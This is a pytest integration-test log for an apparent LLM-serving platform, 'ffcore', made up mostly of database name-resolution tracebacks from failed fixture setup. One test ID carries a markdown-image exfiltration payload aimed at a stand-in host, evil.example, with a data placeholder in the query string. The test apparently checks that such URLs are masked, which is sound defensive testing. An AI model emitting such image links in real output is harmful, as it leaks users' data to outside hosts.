@@ -1,0 +1,3526 @@
+=== 04:31:37 test-int
+........................................................................ [  8%]
+........................................................................ [ 16%]
+........................................................F............... [ 24%]
+..............s......................................................... [ 33%]
+..................................................................s..... [ 41%]
+.....s.................................................................. [ 49%]
+............s........................................................... [ 57%]
+........................................................................ [ 66%]
+........................................................................ [ 74%]
+........................................................................ [ 82%]
+..............................................E................F........ [ 90%]
+.......E...E.EFE.E............EEEE...EE.....EEE.E.s..................... [ 99%]
+.......                                                                  [100%]
+==================================== ERRORS ====================================
+____________ ERROR at setup of test_08t_22_prsim_attachment_is_ek_n ____________
+
+self = <sqlalchemy.engine.base.Connection object at 0x7fec64a26c30>
+engine = Engine(postgresql+psycopg://ffcore:***@postgres:5432/ffcore_test_810981bcb86c)
+connection = None, _has_events = None, _allow_revalidate = True
+_allow_autobegin = True
+
+    def __init__(
+        self,
+        engine: Engine,
+        connection: Optional[PoolProxiedConnection] = None,
+        _has_events: Optional[bool] = None,
+        _allow_revalidate: bool = True,
+        _allow_autobegin: bool = True,
+    ):
+        """Construct a new Connection."""
+        self.engine = engine
+        self.dialect = dialect = engine.dialect
+    
+        if connection is None:
+            try:
+>               self._dbapi_connection = engine.raw_connection()
+                                         ^^^^^^^^^^^^^^^^^^^^^^^
+
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+
+The above exception was the direct cause of the following exception:
+
+make_user = <function make_user.<locals>.make at 0x7fec77465120>
+make_project = <function make_project.<locals>.make at 0x7fec77555760>
+client_factory = <function client_factory.<locals>.make at 0x7fec5bd413a0>
+settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+queue = <tests.integration.test_04a_api.FakeQueue object at 0x7fed044c3620>
+
+    @pytest.fixture
+    def world(make_user, make_project, client_factory, settings, queue):
+        project = make_project()
+        other = make_project()
+        admin_id, admin = make_user(memberships={project: ("admin", "edit")})
+        admin_read_id, admin_read = make_user(memberships={project: ("admin", "read")})
+        analyst_id, analyst = make_user(memberships={project: ("analyst", "edit")})
+        stranger_id, stranger = make_user(memberships={other: ("analyst", "edit")})
+        return {
+            "project": str(project),
+            "other": str(other),
+            "admin": client_factory(admin),
+>           "admin_read": client_factory(admin_read),
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+            "analyst": client_factory(analyst),
+            "stranger": client_factory(stranger),
+            "service": client_factory(),
+            "analyst_id": analyst_id,
+            "admin_id": admin_id,
+        }
+
+tests/integration/test_04a_api.py:67: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/conftest.py:206: in make
+    response = client.post(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1203: in post
+    return self.request(
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:518: in request
+    return super().request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:796: in request
+    return self.send(request, auth=auth, follow_redirects=follow_redirects)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:993: in send
+    raise exc
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:987: in send
+    response.read()
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:877: in read
+    self._content = b"".join(self.iter_bytes())
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:893: in iter_bytes
+    for raw_bytes in self.iter_raw():
+                     ^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:948: in iter_raw
+    for raw_stream_bytes in self.stream:
+                            ^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:143: in __iter__
+    yield from self._stream
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:384: in iter_body
+    exit_stack.close()
+/usr/local/lib/python3.12/contextlib.py:618: in close
+    self.__exit__(None, None, None)
+/usr/local/lib/python3.12/contextlib.py:610: in __exit__
+    raise exc_details[1]
+/usr/local/lib/python3.12/contextlib.py:595: in __exit__
+    if cb(*exc_details):
+       ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:399: in close_app
+    raise exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:366: in run_app
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/applications.py:1194: in __call__
+    await super().__call__(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/applications.py:96: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:186: in __call__
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:164: in __call__
+    await self.app(scope, receive, _send)
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_asgi.py:151: in __call__
+    await self.app(scope, receive, send)
+ffcore/core/logging.py:261: in __call__
+    await self.app(scope, receive, send_status)
+ffcore/api/upload_limit.py:44: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/exceptions.py:63: in __call__
+    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/middleware/asyncexitstack.py:18: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:683: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2811: in app
+    await route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1839: in handle
+    await self.original_router.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2894: in handle
+    await included_router._handle_selected(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1850: in _handle_selected
+    await route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1839: in handle
+    await self.original_router.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2894: in handle
+    await included_router._handle_selected(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1865: in _handle_selected
+    await original_route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1328: in handle
+    await effective_context.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:166: in app
+    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:152: in app
+    response = await f(request)
+               ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:745: in app
+    raw_response = await run_endpoint_function(
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:372: in run_endpoint_function
+    return await dependant.call(**values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/api/auth.py:106: in login
+    user = await session.scalar(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py:720: in scalar
+    return await greenlet_spawn(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:210: in greenlet_spawn
+    result = context.throw(*sys.exc_info())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2534: in scalar
+    return self._execute_internal(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2350: in _execute_internal
+    conn = self._connection_for_bind(bind)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2173: in _connection_for_bind
+    return trans._connection_for_bind(engine, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
+    ret_value = fn(self, *arg, **kw)
+                ^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:1203: in _connection_for_bind
+    conn = bind.connect()
+           ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3275: in connect
+    return self._connection_cls(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:151: in __init__
+    Connection._handle_dbapi_exception_noconnection(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:2432: in _handle_dbapi_exception_noconnection
+    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: in __init__
+    self._dbapi_connection = engine.raw_connection()
+                             ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           sqlalchemy.exc.OperationalError: (psycopg.OperationalError) failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+E           (Background on this error at: https://sqlalche.me/e/21/e3q8)
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+---------------------------- Captured stderr setup -----------------------------
+2026-11-05 01:45:51,227 WARNING ffcore.litellm_reconcile litellm_reconcile_retry attempt=1 error=SecretDecryptError
+2026-11-05 01:45:51,570 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=802
+2026-11-05 01:46:02,270 WARNING ffcore.litellm_reconcile litellm_reconcile_retry attempt=2 error=OperationalError
+2026-11-05 01:46:02,282 WARNING ffcore.litellm_reconcile litellm_reconcile_retry attempt=1 error=OperationalError
+2026-11-05 01:46:02,299 INFO ffcore.access access method=POST path=/api/v1/auth/login status=500 ms=10020
+------------------------------ Captured log setup ------------------------------
+WARNING  ffcore.litellm_reconcile:litellm_reconcile.py:451 litellm_reconcile_retry attempt=1 error=SecretDecryptError
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=200 ms=802
+WARNING  ffcore.litellm_reconcile:litellm_reconcile.py:451 litellm_reconcile_retry attempt=2 error=OperationalError
+WARNING  ffcore.litellm_reconcile:litellm_reconcile.py:451 litellm_reconcile_retry attempt=1 error=OperationalError
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=500 ms=10020
+_______ ERROR at setup of test_08t_m7_blocked_source_masked_on_db_replay _______
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+
+    @pytest.fixture
+    def harness(database_url, settings):
+>       setup(database_url)
+
+tests/integration/runs_fixtures.py:57: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/runtime_support.py:216: in setup
+    asyncio.run(setup_checkpointer(database_url))
+/usr/local/lib/python3.12/asyncio/runners.py:195: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/asyncio/base_events.py:691: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+ffcore/runtime/runner.py:57: in setup_checkpointer
+    async with AsyncPostgresSaver.from_conn_string(checkpointer_dsn(database_url)) as saver:
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/langgraph/checkpoint/postgres/aio.py:81: in from_conn_string
+    async with await AsyncConnection.connect(
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+---------------------------- Captured stderr setup -----------------------------
+2026-11-05 01:48:15,196 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-05 01:48:16,152 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=948
+2026-11-05 01:48:16,336 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p8b20f203.chat-default code=egress_not_allowlisted
+2026-11-05 01:48:16,340 ERROR ffcore.litellm_reconcile litellm_model_not_written model=p8b20f203.tooly code=egress_not_allowlisted
+2026-11-05 01:48:16,340 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=2
+------------------------------ Captured log setup ------------------------------
+ERROR    ffcore.readiness:readiness.py:63 warmup failed: ModelMissing
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=200 ms=948
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p8b20f203.chat-default code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=p8b20f203.tooly code=egress_not_allowlisted
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=0 updated=0 deleted=0 problems=2
+_ ERROR at setup of test_08t_r2_direct_url_lines_keep_the_placeholder[![x]( //evil.example/p?q={v})] _
+
+self = <sqlalchemy.engine.base.Connection object at 0x7fec8c15b110>
+engine = Engine(postgresql+psycopg://ffcore:***@postgres:5432/ffcore_test_810981bcb86c)
+connection = None, _has_events = None, _allow_revalidate = True
+_allow_autobegin = True
+
+    def __init__(
+        self,
+        engine: Engine,
+        connection: Optional[PoolProxiedConnection] = None,
+        _has_events: Optional[bool] = None,
+        _allow_revalidate: bool = True,
+        _allow_autobegin: bool = True,
+    ):
+        """Construct a new Connection."""
+        self.engine = engine
+        self.dialect = dialect = engine.dialect
+    
+        if connection is None:
+            try:
+>               self._dbapi_connection = engine.raw_connection()
+                                         ^^^^^^^^^^^^^^^^^^^^^^^
+
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
